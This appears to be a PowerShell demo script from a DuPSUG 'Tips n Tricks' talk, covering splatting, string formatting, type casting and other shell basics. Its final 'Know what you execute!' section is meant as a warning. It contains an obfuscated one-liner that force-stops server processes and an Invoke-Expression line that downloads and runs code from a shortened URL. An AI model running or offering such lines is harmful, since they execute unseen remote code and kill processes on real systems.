#region ExecutionPolicy
Get-ExecutionPolicy
#endregion ExecutionPolicy

#region Prep
$Files = Get-ChildItem d:\ -Recurse
#endregion Prep

#region Hex
0xfd
#endregion Hex

#region Location, location, location
Push-Location 'D:\PowerShell\TestGenerator'
Push-Location 'D:\PowerShell\PSOCD'
Push-Location 'D:\PowerShell\WSDL'
Pop-Location
Pop-Location
Set-Location 'D:\DuPSUG'

$PSScriptRoot
. "C:\Users\JeffWouters\Desktop\Sessions\PowerShell - Tips 'n Tricks\Script.ps1"
#endregion Location, location, location

#region Prompt
function Prompt { 
    "Methos.nl #> "
}
#endregion Prompt

#region Splatting
Start-Process -FilePath 'C:\windows\system32\ipconfig.exe' -ArgumentList '/All' -RedirectStandardOutput 'C:\test\ipconfig.txt'

$Hash = @{
    'FilePath'               = 'C:\windows\system32\ipconfig.exe'
    'ArgumentList'           = '/All'
    'RedirectStandardOutput' = 'C:\test\ipconfig.txt'
}
Start-Process @Hash
#endregion Splatting

#region PSDrives
Get-PSDrive
# HKLM
dir function:
Get-Content Function:\Set-NetAdapter
Get-Content Function:\Set-NetAdapter | clip
#endregion PSDrives

#region String formatting
$Name = 'Jeff'
$Event = 'DuPSUG'

'Hello, my name is $Name'
"Hello, my name is $Name"

'Hello, my name is {0}' -f $Name
'Hello, my name is {0} and I am at $Event' -f $Name
"Hello, my name is {0} and I am at $Event" -f $Name

'Hello, my name is {1} and it is {0:HH}:{0:mm} on {0:dd}-{0:MM}-{0:yyyy}' -f (Get-Date),$Name

"The variable `$Name has value $Name"
#endregion String formatting

#region Variable squeezing
$Procs = Get-Process
($Procs = Get-Process)
Get-Command -ParameterName passthru | measure
#endregion Variable squeezing

#region Formatting
Get-Command -Verb format
#endregion Formatting

#region Upper & Lower
$string = 'jeff wouters'
$string.ToUpper()
$string.ToLower()
(get-culture).TextInfo.ToTitleCase($String)
#endregion

#region Quick working with multiples
$var = @(
, @(4, 1024)
, @((7), (16))
)
$var[0]

$Hash = @{
    'Utrecht'    = 'Utrecht'
    'Overijssel' = 'Zwolle'
    'Gelderland' = 'Arnhem'
}
$Hash['Gelderland']
#endregion Quick working with multiples

#region Type casting
[string]$string = ''
$String.GetType()
[int]$Int = 1
$Int.GetType()

$string = @{}
$int = 'PowerShell'

rv string,int

$string = [string]''
$String.GetType()
$Int = [int]1
$Int.GetType()

$string = @{}
$int = 'PowerShell'

#region Int + String
$Int + $String
$string + $int
#endregion Int + String

#endregion Type casting

#region Music
[console]::beep(440,500) 
[console]::beep(440,500) 
[console]::beep(440,500) 
[console]::beep(349,350) 
[console]::beep(523,150) 
[console]::beep(440,500) 
[console]::beep(349,350) 
[console]::beep(523,150) 
[console]::beep(440,1000) 
[console]::beep(659,500) 
[console]::beep(659,500) 
[console]::beep(659,500) 
[console]::beep(698,350) 
[console]::beep(523,150) 
[console]::beep(415,500) 
[console]::beep(349,350) 
[console]::beep(523,150) 
[console]::beep(440,1000)
#endregion Music

#region Don't name your variable Error
Get-Variable Error
#endregion Don't name your variable Error

#region Red is scarry
Get-Process -ComputerName fake
(Get-Host).PrivateData
(Get-Host).PrivateData.ErrorForegroundColor = 'Green'
Get-Process -ComputerName fake
#endregion Red is scarry

#region Open Explorer in current path
start-process .
start .
Invoke-Expression .
ii .
#endregion Open Explorer in current path

#region Assumme Get
service
netadapter
process
#endregion Assume Get

#region Clipboard
get-process *power* | clip
get-command -Noun Clipboard
#endregion Clipboard

#region Dot sourcing
ise "C:\Users\JeffWouters\Desktop\Sessions\PowerShell - Tips 'n Tricks\Functions.ps1"

& "C:\Users\JeffWouters\Desktop\Sessions\PowerShell - Tips 'n Tricks\Functions.ps1"
one
. "C:\Users\JeffWouters\Desktop\Sessions\PowerShell - Tips 'n Tricks\Functions.ps1"
one
#endregion Dot sourcing

#region Crtl-C & Crtl-V
#endregion Ctrl-C & Ctrl-V

#region Know what you execute!
#Great on WinSrv12 SQL Servers!
icm {gps *sv* | ? vm -gt 50 | % {spps -f}}
#region Explained
invoke-command -ScriptBlock { get-process -Name *sv* | Where-Object {$_.vm -gt 50} | foreach { stop-process $_ -Force } }
#endregion Explained
#Found online
iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
#endregion Know what you execute!